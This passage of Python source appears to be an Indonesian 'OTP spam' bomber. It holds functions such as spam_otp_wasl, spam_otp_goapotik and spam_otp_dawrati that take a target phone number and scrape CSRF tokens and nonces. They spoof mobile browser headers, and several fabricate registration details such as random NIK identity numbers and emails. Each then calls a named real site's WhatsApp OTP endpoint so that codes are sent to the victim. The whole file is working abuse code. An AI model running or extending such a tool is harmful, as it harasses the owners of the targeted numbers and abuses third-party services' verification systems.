                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_wasl(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        from bs4 import BeautifulSoup
        
        # Format nomor: +6281274307931
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = f"+{raw}"  # +6281274307931
        elif raw.startswith('0'):
            formatted_phone = f"+62{raw[1:]}"  # +6281274307931
        else:
            formatted_phone = f"+62{raw}"  # +6281274307931
        
        print(f"📱 Nomor diformat: {formatted_phone}")
        
        # Generate random name
        random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        # Buat session
        session = requests.Session()
        
        # ========== STEP 1: GET halaman utama ==========
        print("🔹 STEP 1: GET / (ambil cookie & CSRF token)")
        url_get = "https://wasl.link/"
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp_get = session.get(url_get, headers=headers_get, timeout=60)
        print(f"✅ GET Status: {resp_get.status_code}")
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # ========== STEP 2: Ambil CSRF token ==========
        soup = BeautifulSoup(resp_get.text, 'html.parser')
        csrf_token = None
        
        # Cari meta csrf-token
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            csrf_token = csrf_meta.get('content')
            print(f"✅ CSRF Token: {csrf_token}")
        
        # Cari dari input hidden
        if not csrf_token:
            csrf_input = soup.find('input', {'name': '_token'})
            if csrf_input:
                csrf_token = csrf_input.get('value')
                print(f"✅ CSRF Token dari input: {csrf_token}")
        
        if not csrf_token:
            print("⚠️ CSRF token tidak ditemukan, lanjut tanpa token")
        
        # ========== STEP 3: POST /send-code ==========
        print("🔹 STEP 3: POST /send-code (kirim OTP WA)")
        url_post = "https://wasl.link/send-code"
        
        payload = {
            "phone": formatted_phone,
            "name": random_name
        }
        
        headers_post = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://wasl.link",
            "referer": "https://wasl.link/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        # Tambahkan CSRF token
        if csrf_token:
            headers_post["x-csrf-token"] = csrf_token
        
        print(f"📤 Payload: {json.dumps(payload, indent=2)}")
        
        resp_post = session.post(url_post, json=payload, headers=headers_post, timeout=60)
        
        print(f"✅ Status: {resp_post.status_code}")
        print(f"✅ Response: {resp_post.text}")
        print(f"✅ Cookie final: {session.cookies.get_dict()}")
        
        # ========== STEP 4: Parse Response ==========
        try:
            result = resp_post.json()
            print(f"✅ JSON Response: {json.dumps(result, indent=2)}")
            
            if result.get("success") == True:
                print(f"✅ OTP WA berhasil dikirim ke {formatted_phone}")
                print(f"ℹ️ {result.get('message', '')}")
                return True
            else:
                error_msg = result.get("message") or "Unknown error"
                print(f"❌ Gagal: {error_msg}")
                return False
                
        except json.JSONDecodeError:
            if resp_post.status_code == 200:
                print(f"✅ OTP WA berhasil dikirim ke {formatted_phone} (status 200)")
                return True
            else:
                print(f"❌ Response bukan JSON: {resp_post.text[:200]}")
                return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_mazoom(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format nomor: +62 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            phone = '+62' + raw
        else:
            phone = '+62' + raw
        
        session = requests.Session()
        
        # STEP 1: GET /auth - ambil cookie & next-action
        print("🔹 STEP 1: GET /auth (ambil cookie & headers)")
        url = "https://rsvp.mazoom.sa/auth"
        headers = {
            "accept": "text/x-component",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://rsvp.mazoom.sa/auth",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # STEP 2: POST /auth - kirim OTP
        print("🔹 STEP 2: POST /auth")
        otp_url = "https://rsvp.mazoom.sa/auth"
        otp_headers = {
            "accept": "text/x-component",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "text/plain;charset=UTF-8",
            "next-action": "708e8d4f3f9f1738341dc1b007c65903faf2adb33a",
            "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22auth%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
            "origin": "https://rsvp.mazoom.sa",
            "referer": "https://rsvp.mazoom.sa/auth",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-deployment-id": "dpl_tVx38ytWk57ZGTpeyjEBuLqBQdN7"
        }
        
        # Format payload: array ["+6281274307931", false, "ar"]
        payload = [phone, False, "ar"]
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        resp = session.post(otp_url, data=json.dumps(payload), headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            # Response format: 0:{"a":"$@1","f":"","b":"..."}\n1:{"success":true}
            result_text = resp.text
            if '"success":true' in result_text:
                print(f"✅ SUKSES!")
                return True
            else:
                print(f"❌ GAGAL: {result_text}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_mithaq(nomor):
    try:
        import re
        import requests
        from bs4 import BeautifulSoup
        import time
        
        # Format nomor: +62 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            phone = '+62' + raw
        else:
            phone = '+62' + raw
        
        session = requests.Session()
        
        # STEP 1: GET /mithaq-register/ - ambil cookie & nonce
        print("🔹 STEP 1: GET /mithaq-register/ (ambil cookie & nonce)")
        url = "https://mithaq.life/mithaq-register/"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil nonce dari HTML - cari di script woaData
        nonce = None
        
        # Cari di script yang mengandung woaData
        nonce_match = re.search(r'nonce["\']\s*:\s*["\']([^"\']+)["\']', resp.text)
        if nonce_match:
            nonce = nonce_match.group(1)
        
        if not nonce:
            # Cari di meta atau input
            nonce_input = re.search(r'name="woa_ajax_nonce"\s+value="([^"]+)"', resp.text)
            if nonce_input:
                nonce = nonce_input.group(1)
        
        if not nonce:
            # Fallback pake nonce dari curl
            nonce = "95f7d56fbc"
            print(f"⚠️ Nonce tidak ditemukan, pake default: {nonce}")
        else:
            print(f"✅ Nonce: {nonce}")
        
        # STEP 2: POST /wp-admin/admin-ajax.php - kirim OTP
        print("🔹 STEP 2: POST /wp-admin/admin-ajax.php")
        otp_url = "https://mithaq.life/wp-admin/admin-ajax.php"
        otp_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://mithaq.life",
            "referer": "https://mithaq.life/mithaq-register/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        otp_data = {
            "action": "woa_send_otp",
            "nonce": nonce,
            "phone": phone,
            "channel": "whatsapp",
            "context": "register"
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES! {result.get('data', {}).get('message', '')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_goapotik(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format nomor: 0 + raw (contoh: 081274307931)
        raw = re.sub(r'\D', '', nomor)
        
        # Format: 081274307931
        if raw.startswith('0'):
            phone_display = raw
        elif raw.startswith('62'):
            phone_display = '0' + raw[2:]  # 6281274307931 -> 081274307931
        else:
            phone_display = '0' + raw      # 81274307931 -> 081274307931
        
        # ENCODE KE HEX!
        phone_hex = phone_display.encode().hex()
        # Hasil: 303831323734333037393331
        
        session = requests.Session()
        
        # STEP 1: GET /auth/register - ambil cookie
        print("🔹 STEP 1: GET /auth/register (ambil cookie)")
        url = "https://m.goapotik.com/auth/register"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # STEP 2: POST /api/auth/register/phone - kirim OTP
        print("🔹 STEP 2: POST /api/auth/register/phone")
        otp_url = "https://m.goapotik.com/api/auth/register/phone"
        otp_headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://m.goapotik.com",
            "referer": "https://m.goapotik.com/auth/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        payload = {
            "telephone": phone_hex,
            "iv": "00000000000000000000000000000000",
            "type": "wa"
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone_display}")
        print(f"🔑 Phone HEX: {phone_hex}")
        resp = session.post(otp_url, json=payload, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('code') == "2000":
                print(f"✅ SUKSES! {result.get('message')}")
                print(f"🔑 Verification Key: {result.get('data', {}).get('verification_key')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_sunsetdikebun(nomor):
    try:
        import re
        import requests
        import random
        import string
        import time
        from bs4 import BeautifulSoup
        
        # Format nomor: 81272057770 (tanpa 0/62, sesuai curl)
        raw = re.sub(r'\D', '', nomor)
        phone = raw  # 81272057770
        phonecode = "62"
        
        # Format phone dengan 0 + raw untuk display
        phone_display = '0' + phone  # 081272057770
        
        # Generate random data
        name = ''.join(random.choices(string.ascii_lowercase, k=6))
        email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
        nik = ''.join(random.choices('0123456789', k=16))
        password = "Hahaha666"
        dob = f"{random.randint(1970, 2005)}-{str(random.randint(1,12)).zfill(2)}-{str(random.randint(1,28)).zfill(2)}"
        gender = random.choice(["male", "female"])
        regional = random.choice(["Kota Bogor", "Jakarta Selatan", "Bandung", "Denpasar", "Kota Surabaya"])
        employment = random.choice(["Karyawan", "Freelancer", "Wirausaha", "Pelajar/Mahasiswa"])
        
        session = requests.Session()
        
        # STEP 1: GET /signup - ambil cookie & CSRF
        print("🔹 STEP 1: GET /signup (ambil cookie & csrf)")
        url = "https://sunsetdikebun.id/signup"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil CSRF token dari meta tag
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            csrf_token = csrf_meta.get('content')
        else:
            # Cari dari livewire script
            csrf_match = re.search(r'data-csrf="([^"]+)"', resp.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)
            else:
                print("❌ CSRF token tidak ditemukan")
                return False
        
        print(f"✅ CSRF Token: {csrf_token}")
        
        # STEP 2: POST /register - coba register
        print("🔹 STEP 2: POST /register (coba register)")
        register_url = "https://sunsetdikebun.id/register"
        register_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://sunsetdikebun.id",
            "referer": "https://sunsetdikebun.id/signup",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token
        }
        
        register_payload = {
            "name": name,
            "email": email,
            "phonecode": phonecode,
            "phone": phone,
            "nik": nik,
            "date_of_birth": dob,
            "password": password,
            "gender": gender,
            "regional": regional,
            "employment": employment
        }
        
        print(f"📝 Mencoba register dengan:")
        print(f"   Name: {name}")
        print(f"   Email: {email}")
        print(f"   Phone: {phone_display}")
        print(f"   NIK: {nik}")
        
        register_resp = session.post(register_url, json=register_payload, headers=register_headers, timeout=60)
        print(f"✅ Register Response: {register_resp.text[:200]}")
        
        # STEP 3: POST /request-otp - request OTP via forgot password
        print("🔹 STEP 3: POST /request-otp (request OTP)")
        otp_url = "https://sunsetdikebun.id/request-otp"
        otp_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://sunsetdikebun.id",
            "referer": "https://sunsetdikebun.id/forgot",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token
        }
        
        otp_payload = {
            "phone": phone,
            "phonecode": phonecode
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone_display}")
        otp_resp = session.post(otp_url, json=otp_payload, headers=otp_headers, timeout=60)
        print(f"✅ OTP Response: {otp_resp.text}")
        
        if otp_resp.status_code == 200:
            result = otp_resp.json()
            if result.get('status') == True:
                print(f"✅ SUKSES! {result.get('message')}")
                print(f"📱 Phone: {result.get('data', {}).get('phone')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_ghlindia(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        from fake_useragent import UserAgent
        
        # ========== FORMAT NOMOR ==========
        raw = re.sub(r'\D', '', nomor)
        if len(raw) >= 10:
            phone = raw[-10:]
        else:
            phone = raw
        
        # ========== RANDOM EMAIL ==========
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"user{random_str}@gmail.com"
        
        print(f"📱 Target: {phone}")
        print(f"📧 Email: {email}")
        
        # ========== SESSION + FAKE UA ==========
        session = requests.Session()
        ua = UserAgent()
        
        # ========== STEP 1: GET /register - AMBIL COOKIE ==========
        print("🔹 STEP 1: GET /register (ambil cookie)")
        register_url = "https://ghlindia.com/register"
        register_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "user-agent": ua.random
        }
        
        register_resp = session.get(register_url, headers=register_headers, timeout=60)
        print(f"✅ Register Status: {register_resp.status_code}")
        print(f"🍪 Cookie: {session.cookies.get_dict()}")
        
        # ========== STEP 2: POST OTP ==========
        print("🔹 STEP 2: POST /otpfinalsmtp")
        url = "https://ghlindia.com/otpfinalsmtp"
        
        post_headers = {
            "authority": "ghlindia.com",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://ghlindia.com",
            "referer": "https://ghlindia.com/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": ua.random,
            "x-requested-with": "XMLHttpRequest"
        }
        
        data = {
            "name": "user" + ''.join(random.choices(string.digits, k=4)),
            "emailid": email,
            "send_otp_wapp": "Yes",
            "phonecode": "62",
            "phone": phone
        }
        
        print(f"📦 Data: {data}")
        
        response = session.post(url, data=data, headers=post_headers, timeout=60)
        
        print(f"📡 Status Code: {response.status_code}")
        print(f"🍪 Cookie setelah POST: {session.cookies.get_dict()}")
        
        result = response.json()
        print(f"📦 Response: {json.dumps(result, indent=2, ensure_ascii=False)}")
        
        if result.get("status") == 1:
            print(f"✅ OTP terkirim! Insert ID: {result.get('insert_id')}")
            return True
        else:
            print(f"❌ Gagal: {result}")
            return False
            
    except Exception as e:
        print(f"💀 Error: {str(e)}")
        return False

def spam_otp_opaper(nomor):
    try:
        import re
        import requests
        import json
        
        # Format nomor
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = raw[2:]  # ambil 812xxxxx
            country_code = '62'
        elif raw.startswith('0'):
            formatted_phone = raw[1:]   # 812xxxxx
            country_code = '62'
        else:
            formatted_phone = raw
            country_code = '62'
        
        session = requests.Session()
        
        # STEP 1: Check phone number
        print("🔹 STEP 1: POST /auth/v1/phone-number/check")
        url_check = "https://api.opaper.app/auth/v1/phone-number/check"
        
        headers = {
            "accept": "*/*",
            "accept-language": "null",
            "content-type": "application/json",
            "op-au": "null",
            "op-user-id": "null",
            "origin": "https://dashboard.opaper.app",
            "referer": "https://dashboard.opaper.app/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-login-client": "DASHBOARD"
        }
        
        payload_check = {
            "phone_number": formatted_phone,
            "country_code": country_code
        }
        
        resp_check = session.post(url_check, json=payload_check, headers=headers, timeout=60)
        print(f"✅ Status Check: {resp_check.status_code}")
        print(f"✅ Response Check: {resp_check.text}")
        
        # Cek response check
        try:
            check_result = resp_check.json()
            if check_result.get("code") != 200:
                print(f"❌ Check gagal: {check_result}")
                return False
                
            exists = check_result.get("data", {}).get("exists", False)
            print(f"✅ Nomor exist: {exists}")
            
        except:
            print("❌ Response check bukan JSON")
            return False
        
        # STEP 2: Kirim OTP via WA
        print("🔹 STEP 2: POST /auth/v1/otp/send (kirim OTP WA)")
        url_otp = "https://api.opaper.app/auth/v1/otp/send"
        
        payload_otp = {
            "phone_number": formatted_phone,
            "country_code": country_code,
            "channel": "whatsapp",
            "purpose": "signup"
        }
        
        resp_otp = session.post(url_otp, json=payload_otp, headers=headers, timeout=60)
        print(f"✅ Status OTP: {resp_otp.status_code}")
        print(f"✅ Response OTP: {resp_otp.text}")
        
        # Cek hasil OTP
        try:
            otp_result = resp_otp.json()
            if otp_result.get("code") == 200 and otp_result.get("data", {}).get("session_id"):
                print(f"✅ OTP WA berhasil dikirim ke {country_code}{formatted_phone}")
                print(f"✅ Session ID: {otp_result['data']['session_id']}")
                return True
            else:
                print(f"❌ OTP gagal: {otp_result}")
                return False
        except:
            print(f"❌ Response OTP bukan JSON: {resp_otp.text}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_dawrati(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        
        # Format nomor
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '+62' + raw[2:]
        elif raw.startswith('0'):
            formatted_phone = '+62' + raw[1:]
        else:
            formatted_phone = '+62' + raw
        
        # Random data
        random_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
        random_email = f"{random_name}{random.randint(100, 999)}@gmail.com"
        
        session = requests.Session()
        
        # STEP 1: Kirim data ke webhook
        print("🔹 STEP 1: POST webhook LeadConnectorHQ (kirim OTP WA)")
        url = "https://services.leadconnectorhq.com/hooks/iNaqmWOFMpaNowgoQpO9/webhook-trigger/f5c8e514-8470-429b-8c6f-40fa2d0023d8"
        
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://dawrati.ai",
            "referer": "https://dawrati.ai/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        payload = {
            "first_name": random_name,
            "last_name": "",
            "full_name": random_name,
            "email": random_email,
            "phone": formatted_phone
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=60)
        print(f"✅ Status: {resp.status_code}")
        print(f"✅ Response: {resp.text}")
        
        # Cek hasil
        try:
            result = resp.json()
            if result.get("status") and "Success" in result.get("status", ""):
                print(f"✅ OTP WA berhasil dikirim ke {formatted_phone}")
                print(f"✅ ID: {result.get('id')}")
                return True
            else:
                print(f"❌ Gagal: {result}")
                return False
        except:
            print(f"❌ Response bukan JSON: {resp.text}")
            return False
            
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return False

def spam_otp_orgwater(nomor):
    try:
        import re
        import requests
        from bs4 import BeautifulSoup
        
        # Format nomor
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            formatted_phone = '+62' + raw[2:]
            phone_without_code = raw[2:]
        elif raw.startswith('0'):
            formatted_phone = '+62' + raw[1:]
            phone_without_code = raw[1:]
        else:
            formatted_phone = '+62' + raw
            phone_without_code = raw
        
        session = requests.Session()
        
        # STEP 1: GET halaman login - ambil cookie & _token
        print("🔹 STEP 1: GET /login (ambil cookie & _token)")
        url_get = "https://orgwater.com/login"
        
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp_get = session.get(url_get, headers=headers_get, timeout=60)
        print(f"✅ Status GET: {resp_get.status_code}")
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil _token dari hidden input
        soup = BeautifulSoup(resp_get.text, 'html.parser')
        token_input = soup.find('input', {'name': '_token'})
        
        if not token_input:
            # Coba ambil dari meta csrf-token
            meta_csrf = soup.find('meta', {'name': 'csrf-token'})
            if meta_csrf:
                token = meta_csrf.get('content')
            else:
                print("❌ _token tidak ditemukan!")
                return False
        else:
            token = token_input.get('value')
        
        print(f"✅ _token: {token}")
        
        # STEP 2: Kirim OTP via WA
        print("🔹 STEP 2: POST /send-otp (kirim OTP WA)")
        url_post = "https://orgwater.com/send-otp"
        
        headers_post = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://orgwater.com",
            "referer": "https://orgwater.com/login",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            
